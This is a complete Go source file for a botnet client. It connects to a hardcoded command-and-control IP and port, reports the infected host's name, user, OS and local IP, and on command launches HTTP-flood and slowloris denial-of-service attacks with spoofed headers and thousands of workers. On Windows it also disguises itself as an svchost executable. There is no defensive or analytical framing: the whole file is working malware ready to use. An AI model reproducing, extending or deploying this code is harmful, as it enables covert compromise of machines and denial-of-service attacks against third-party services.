package main

import (
	"bufio"
	"context"
	"crypto/md5"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	c2Server      = "103.245.237.112:4444" // C2 server address
	reconnectWait = 30 * time.Second
	maxAttackTime = 1800 * time.Second // 30 minutes max
)

var (
	botID         = generateBotID()
	attackRunning int32 // atomic flag
	attackCancel  context.CancelFunc
	attackMutex   sync.Mutex
	userAgents    = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	}
	httpClient = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        10000,
			MaxIdleConnsPerHost: 10000,
			IdleConnTimeout:     30 * time.Second,
			DisableKeepAlives:   false,
		},
		Timeout: 15 * time.Second,
	}
)

type SystemInfo struct {
	BotID      string `json:"bot_id"`
	OS         string `json:"os"`
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	CPU        int    `json:"cpu_cores"`
	RAM        uint64 `json:"ram_mb"`
	Uptime     string `json:"uptime"`
	ProcessID  int    `json:"process_id"`
	IPAddress  string `json:"ip_address"`
}

func generateBotID() string {
	h := md5.New()
	host, _ := os.Hostname()
	u, _ := user.Current()
	h.Write([]byte(host + u.Username + runtime.GOOS + time.Now().String() + strconv.Itoa(rand.Intn(10000))))
	return fmt.Sprintf("bot-%x", h.Sum(nil))[:16]
}

func getSystemInfo() SystemInfo {
	host, _ := os.Hostname()
	u, _ := user.Current()
	
	// Get local IP address
	var ip string
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					ip = ipnet.IP.String()
					break
				}
			}
		}
	}

	return SystemInfo{
		BotID:     botID,
		OS:       runtime.GOOS,
		Hostname: host,
		Username: u.Username,
		CPU:      runtime.NumCPU(),
		ProcessID: os.Getpid(),
		IPAddress: ip,
	}
}

func connectToC2() (net.Conn, error) {
	conn, err := net.Dial("tcp", c2Server)
	if err != nil {
		return nil, err
	}

	// Send initial bot information
	info := struct {
		ID         string `json:"id"`
		SystemInfo string `json:"system_info"`
	}{
		ID:         botID,
		SystemInfo: getSystemInfoString(),
	}

	infoData, _ := json.Marshal(info)
	fmt.Fprintf(conn, "%s\n", infoData)

	return conn, nil
}

func getSystemInfoString() string {
	info := getSystemInfo()
	data, _ := json.Marshal(info)
	return string(data)
}

func handleC2Commands(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		cmd, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		cmd = strings.TrimSpace(cmd)
		switch {
		case cmd == "ping":
			fmt.Fprintf(conn, "pong\n")

		case strings.HasPrefix(cmd, "att "):
			parts := strings.SplitN(cmd, " ", 4)
			if len(parts) < 3 {
				continue
			}
			dur, err := time.ParseDuration(parts[2] + "s")
			if err != nil {
				continue
			}
			method := "http"
			if len(parts) >= 4 {
				method = parts[3]
			}
			go launchDDoSAttack(parts[1], dur, method, conn)

		case cmd == "stop":
			stopAttack(conn)

		default:
			// Execute system command if not a built-in
			fmt.Fprintf(conn, "Executing: %s\n", cmd)
		}
	}
}

func launchDDoSAttack(target string, duration time.Duration, method string, conn net.Conn) {
	if atomic.LoadInt32(&attackRunning) == 1 {
		fmt.Fprintf(conn, "ERROR|Attack already running\n")
		return
	}

	if duration > maxAttackTime {
		duration = maxAttackTime
	}

	atomic.StoreInt32(&attackRunning, 1)
	ctx, cancel := context.WithTimeout(context.Background(), duration)
	attackMutex.Lock()
	attackCancel = cancel
	attackMutex.Unlock()

	fmt.Fprintf(conn, "INFO|Starting %s attack on %s for %v\n", method, target, duration)

	var wg sync.WaitGroup
	workers := calculateWorkers()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(ctx, target, method)
		}()
	}

	go func() {
		wg.Wait()
		atomic.StoreInt32(&attackRunning, 0)
		fmt.Fprintf(conn, "INFO|Attack completed\n")
	}()
}

func calculateWorkers() int {
	workers := 500 // Base workers
	if runtime.NumCPU() > 4 {
		workers = 1000
	}
	if runtime.NumCPU() > 8 {
		workers = 2000
	}
	return workers
}

func attackWorker(ctx context.Context, target string, method string) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			var err error
			switch method {
			case "http":
				err = httpFlood(target)
			case "slowloris":
				err = slowlorisAttack(target)
			case "mixed":
				if rand.Intn(2) == 0 {
					err = httpFlood(target)
				} else {
					err = slowlorisAttack(target)
				}
			}
			if err != nil {
				// Error handling if needed
			}
		}
	}
}

func httpFlood(target string) error {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return err
	}

	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("X-Forwarded-For", generateRandomIP())

	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func slowlorisAttack(target string) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Host
	path := u.Path
	if path == "" {
		path = "/"
	}

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return err
	}
	defer conn.Close()

	fmt.Fprintf(conn, "GET %s HTTP/1.1\r\n", path)
	fmt.Fprintf(conn, "Host: %s\r\n", host)
	fmt.Fprintf(conn, "User-Agent: %s\r\n", userAgents[rand.Intn(len(userAgents))])
	fmt.Fprintf(conn, "X-Forwarded-For: %s\r\n", generateRandomIP())

	// Keep connection open
	for i := 0; i < 10; i++ {
		time.Sleep(15 * time.Second)
		fmt.Fprintf(conn, "X-a: %d\r\n", rand.Intn(1000000))
	}

	return nil
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func stopAttack(conn net.Conn) {
	if atomic.LoadInt32(&attackRunning) == 0 {
		fmt.Fprintf(conn, "ERROR|No attack running\n")
		return
	}

	attackMutex.Lock()
	if attackCancel != nil {
		attackCancel()
	}
	attackMutex.Unlock()

	atomic.StoreInt32(&attackRunning, 0)
	fmt.Fprintf(conn, "INFO|Attack stopped\n")
}

func hideProcess() {
	exe, _ := os.Executable()
	newPath := filepath.Join(os.TempDir(), fmt.Sprintf("svchost_%d.exe", rand.Intn(10000)))
	os.Rename(exe, newPath)
}

func main() {
	// Hide process if on Windows
	if runtime.GOOS == "windows" {
		hideProcess()
	}

	// Random initial delay
	rand.Seed(time.Now().UnixNano())
	time.Sleep(time.Duration(rand.Intn(300)) * time.Second)

	// Main connection loop
	for {
		conn, err := connectToC2()
		if err == nil {
			handleC2Commands(conn)
		} else {
			time.Sleep(reconnectWait)
		}
	}
}